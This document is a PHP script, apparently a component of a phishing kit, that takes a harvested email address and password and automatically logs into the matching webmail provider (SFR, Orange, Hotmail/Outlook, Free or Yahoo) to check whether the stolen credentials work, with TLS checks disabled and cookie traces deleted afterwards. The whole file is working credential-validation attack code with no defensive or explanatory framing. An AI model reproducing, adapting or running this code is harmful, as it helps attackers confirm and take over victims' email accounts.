﻿<?php
error_reporting(0);
$user1=$email;
$pass1=$pwd;
$emailx=str_replace("@","%40",$email);
$email1x=strtolower($emailx);
$email2x=strtolower($email);
$domain = strstr($email2x, '@');
$cookie = $ip . ".txt";

$agent = $_SERVER['HTTP_USER_AGENT'];
function doRequest($method, $url, $referer, $agent, $cookie, $vars) {
    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if($referer != "") {
	curl_setopt($ch, CURLOPT_REFERER, $referer);
    }
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
    }
    if (substr($url, 0, 5) == "https") {
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
    }
    $str = curl_exec($ch);
    curl_close($ch);
    if ($str) {
        return $str;
    } else {
        return curl_error($ch);
    }
}

function get($url, $referer, $agent, $cookie) {
    return doRequest('GET', $url, $referer, $agent, $cookie, 'NULL');
}

function post($url, $referer, $agent, $cookie,  $vars) {
    return doRequest('POST', $url, $referer, $agent, $cookie, $vars);
}

    if ((strpos($user1, "@sfr.fr") != false) || (strpos($user1, "@neuf.fr") != false) || (strpos($user1, "@online.fr") != false) || (strpos($user1, "@9online.fr") != false) || (strpos($user1, "@club-internet.fr") != false) || (strpos($user1, "@cegetel.net") != false) || (strpos($user1, "@SFR.FR") != false) || (strpos($user1, "@NEUF.FR") != false) || (strpos($user1, "@CLUB-INTERNET.FR") != false) || (strpos($user1, "@CEGETEL.NET"))) {	$url='http://www.sfr.fr/mon-espace-client/?sfrintid=P_head_ec#sfrclicid=P_head_ec';
	$str=get($url, '', $agent, $cookie);
	preg_match_all('/name="lt" value="(.*?)" \/>/si',$str,$matchs);
    $lt = $matchs[1][0];
	
	preg_match_all('/name="execution" value="(.*?)" \/>/si',$str,$matchs);
    $ex = $matchs[1][0];

	$reffer='https://www.sfr.fr/cas/login?service=https%3A%2F%2Fwww.sfr.fr%2Faccueil%2Fj_spring_cas_security_check&sfrintid=EC_head_ec';
	$url='https://www.sfr.fr/cas/login';
    $vars='domain=mire-ec&service=https%3A%2F%2Fwww.sfr.fr%2Faccueil%2Fj_spring_cas_security_check#sfrclicid=EC_mire_Me-Connecter&lt='.$lt.'&execution='.$ex.'&_eventId=submit&username='.urlencode($user1).'&password='.urlencode($pass1).'&remember-me=off&identifier=Submit';
    $str=post($url, $reffer, $agent, $cookie, $vars);

    $url='https://www.sfr.fr/mon-espace-client/';
	$str=get($url, '', $agent, $cookie);
	$firsterror="1";
	
      if (strpos($str, "prenom") != false){
	    $firsterror="0";
		}
    }
	if ((strpos($user1, "@orange.fr") != false) || (strpos($user1, "@wanadoo.fr") != false) || (strpos($user1, "@ORANGE.FR") != false) || (strpos($user1, "@WANADOO.FR") != false)) {
	$url='https://id.orange.fr/auth_user/bin/auth_user.cgi?service=communiquer&return_url=https://webmail1m.orange.fr/webmail/fr_FR/index.html';
	$str=get($url, '', $agent, $cookie);
	$reffer='https://id.orange.fr/auth_user/bin/auth_user.cgi?service=communiquer&return_url=https://webmail1m.orange.fr/webmail/fr_FR/index.html';
	$url='https://id.orange.fr/auth_user/bin/auth_user.cgi';
    $vars='co=42&tt=&tp=&rl=https%3A%2F%2Fwebmail1m.orange.fr%2Fwebmail%2Ffr_FR%2Findex.html&sv=communiquer&dp=html&rt=&isconn=0&credential='.urlencode($user1).'&password='.urlencode($pass1).'&memorize_login=&memorize_password=';
    $str=post($url, $reffer, $agent, $cookie, $vars);
	$firsterror="1";
	
      if (strpos($str, "redirect") != false){
	    $firsterror="0";
		}
    }
	
if ((strpos($user1, "@hotmail.fr") != false) || (strpos($user1, "@live.fr") != false)  || (strpos($user1, "@live.com") != false) || (strpos($user1, "@hotmail.com") != false) || (strpos($user1, "@outlook.fr") != false) || (strpos($user1, "@outlook.com") != false)) {

	$EmailOperCheckHash = md5(md5($user1.$pass1).md5(md5(time).md5(rand(1111111,9999999))));
	
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://login.live.com/?pcexp=false');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, realpath('.')."/HotmailCheckCookie-".$EmailOperCheckHash.".txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, realpath('.')."/HotmailCheckCookie-".$EmailOperCheckHash.".txt");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16");
	curl_setopt($ch, CURLOPT_REFERER, 'https://mid.live.com/');
 	$ReturnedData1 = curl_exec($ch);
	$DoAction = FetchData("urlPost:'","'",$ReturnedData1);
	$PPFT = FetchData('name="PPFT" id="i0327" value="','"',$ReturnedData1);
	$AcountDt = array();
	$AcountDt['login'] = $user1;
	$AcountDt['loginfmt'] = $user1;
	$AcountDt['passwd'] = $pass1;
	$AcountDt['PPFT'] = $PPFT;
	$AcountDt['PPSX'] = 'Pass';
	$AcountDt['NewUser'] = '1';
	$AcountDt['type'] = '11';
	$AcountDt['LoginOptions'] = '3';
	$AcountDt['m1'] = '1920';
	$AcountDt['m2'] = '1200';
	$AcountDt['m3'] = '0';
	$AcountDt['i3'] = '80765';
	$AcountDt['i12'] = '1';
	$AcountDt['i17'] = '1';
	$AcountDt['i18'] = '__MobileLogin|1,';
    foreach($AcountDt as $TpKey => $TpVal){
		$TpVal = urlencode($TpVal);
		$PstDt .= "{$TpKey}={$TpVal}&";
	}
	$PstDt = rtrim($PstDt,"&");
    curl_setopt($ch, CURLOPT_URL, $DoAction);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $PstDt);
    curl_setopt($ch, CURLOPT_POST, 1);
	$ReturnedData = curl_exec($ch);
	curl_close($ch);
	
	if(preg_match("/".preg_quote("JavaScript required to sign in")."/is",$ReturnedData)){
		$firsterror="0";
	}elseif(preg_match("/".preg_quote("The sign-in information you entered is incorrect")."/is",$ReturnedData)){
		$firsterror="0";
	}else{
		$firsterror="0";
	}
	@unlink(realpath('.').'/HotmailCheckCookie-'.$EmailOperCheckHash.'.txt');

	
    }
if ((strpos($user1, "@free.fr") != false)) {

	$EmailOperCheckHash = md5(md5($user1.$pass1).md5(md5(time).md5(rand(1111111,9999999))));
	
	
	$AcountDt = array();
	$LoginSplit = explode('@',$user1);
	$AcountDt['login'] = trim($LoginSplit[0]);
	$AcountDt['password'] = $pass1;
	$AcountDt['actionID'] = '105';
	$AcountDt['url'] = '';
	$AcountDt['mailbox'] = 'INBOX';
	$AcountDt['Envoyer'] = 'Connexion';
	foreach($AcountDt as $TpKey => $TpVal){
		$TpVal = urlencode($TpVal);
		$PstDt .= "{$TpKey}={$TpVal}&";
	}
	$PstDt = rtrim($PstDt,"&");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://zimbra.free.fr/zimbra.pl');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, realpath('.')."/FreeCheckCookie-".$EmailOperCheckHash.".txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, realpath('.')."/FreeCheckCookie-".$EmailOperCheckHash.".txt");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0");
	curl_setopt($ch, CURLOPT_REFERER, 'http://zimbra.free.fr');
	curl_setopt($ch, CURLOPT_POSTFIELDS, $PstDt);
    curl_setopt($ch, CURLOPT_POST, 1);
	$ReturnedData = curl_exec($ch);
	curl_close($ch);
	unset($CheckResult);
	$CheckResult = array();
	if(preg_match("#".preg_quote('zimbra.free.fr/zimbra/mail')."#is",$ReturnedData)){
		$firsterror="0";
	}else{
		$firsterror="0";
	}
	@unlink(realpath('.').'/FreeCheckCookie-'.$EmailOperCheckHash.'.txt');
	
	
    }
	
if ((strpos($user1, "@yahoo.fr") != false) || (strpos($user1, "@yahoo.com") != false)) {

	
	$EmailOperCheckHash = md5(md5($user1.$pass1).md5(md5(time).md5(rand(1111111,9999999))));
	
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://login.yahoo.com');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, realpath('.')."/YahooCheckCookie-".$EmailOperCheckHash.".txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, realpath('.')."/YahooCheckCookie-".$EmailOperCheckHash.".txt");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0");
	$ReturnedData1 = curl_exec($ch);
	
	$AcountDt = array();
	$AcountDt['_crumb'] = FetchData('name="_crumb" type="hidden" value="','"',$ReturnedData1);
	$AcountDt['_ts'] = FetchData('name="_ts" type="hidden" value="','"',$ReturnedData1);
	$AcountDt['_format'] = FetchData('name="_format" type="hidden" value="','"',$ReturnedData1);
	$AcountDt['_uuid'] = FetchData('name="_uuid" type="hidden" value="','"',$ReturnedData1);
	$AcountDt['_seqid'] = FetchData('name="_seqid" type="hidden" value="','"',$ReturnedData1);
	$AcountDt['otp_channel'] = FetchData('name="otp_channel" value="','"',$ReturnedData1);
	
	$AcountDt['username'] = $user1;
	$AcountDt['passwd'] = $pass1;
	$AcountDt['.persistent'] = 'y';
	$AcountDt['signin'] = '';
	$AcountDt['_tpa'] = '';
	$AcountDt['_muh'] = '';
	$AcountDt['otp_ref_cc_intl'] = '';
	foreach($AcountDt as $TpKey => $TpVal){
		$TpVal = urlencode($TpVal);
		$PstDt .= "{$TpKey}={$TpVal}&";
	}
	$PstDt = rtrim($PstDt,"&");
	
	
    curl_setopt($ch, CURLOPT_URL, 'https://login.yahoo.com/config/login');
	curl_setopt($ch, CURLOPT_REFERER, 'https://login.yahoo.com');
	curl_setopt($ch, CURLOPT_POSTFIELDS, $PstDt);
    curl_setopt($ch, CURLOPT_POST, 1);
	$ReturnedData = curl_exec($ch);
	curl_close($ch);
	unset($CheckResult);
	$CheckResult = array();
	if(preg_match("#".preg_quote('yahoo.com uncompressed/chunked')."#is",$ReturnedData)){
		$CheckResult['Status'] = 'Valid';
		$CheckResult['Msg'] = 'Login Done';
		$CheckResult['Email'] = $Email;
		$CheckResult['Pass'] = $Password;
		$firsterror="0";

		
	}else{
		$CheckResult['Status'] = 'Error';
		$CheckResult['Msg'] = 'email or password incorrect or Something Wrong';
		$CheckResult['Email'] = $Email;
		$CheckResult['Pass'] = $Password;
		$firsterror="0";

	}
	@unlink(realpath('.').'/YahooCheckCookie-'.$EmailOperCheckHash.'.txt');
   }
	
  if($firsterror=="0"){
   @unlink($cookie);
  }
function FetchData($Start,$End,$Str){
	$DataSplit = explode($Start,$Str);
	$DataClean = explode($End,$DataSplit[1]);
	$Data = trim($DataClean[0]);
	return $Data;
}
?>
 